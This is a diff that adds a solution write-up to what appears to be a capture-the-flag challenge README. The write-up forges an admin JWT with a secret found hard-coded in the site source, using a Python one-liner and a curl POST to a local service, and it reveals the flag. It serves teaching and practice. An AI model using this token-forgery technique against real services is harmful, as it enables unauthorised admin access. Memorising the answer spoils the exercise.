@@ -11,3 +11,16 @@ make run
 ```
 
 ## Solution
+
+1. Open the website on port 7000 and see the source code.
+2. Notice secret hard coded in source code.
+3. Server is using JWT for authentication with that secret.
+4. Generate valid admin token using python: 
+```bash 
+python3 -c "import jwt;print(jwt.encode({'username':'admin', 'admin':True}, 'coconutmall', algorithm='HS256'))"
+```
+5. Send admin token via a POST request to /api/login using curl:
+```bash
+curl -X POST http://localhost:7000/api/login -d 'session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9.8CNddcuQ8li-B8o8AJ7eCmXdhcIZLqn_0VKNppBkSOw'
+```
+6. Get flag in response: `gigem{hardcoded_secrets_in_plaintext}`
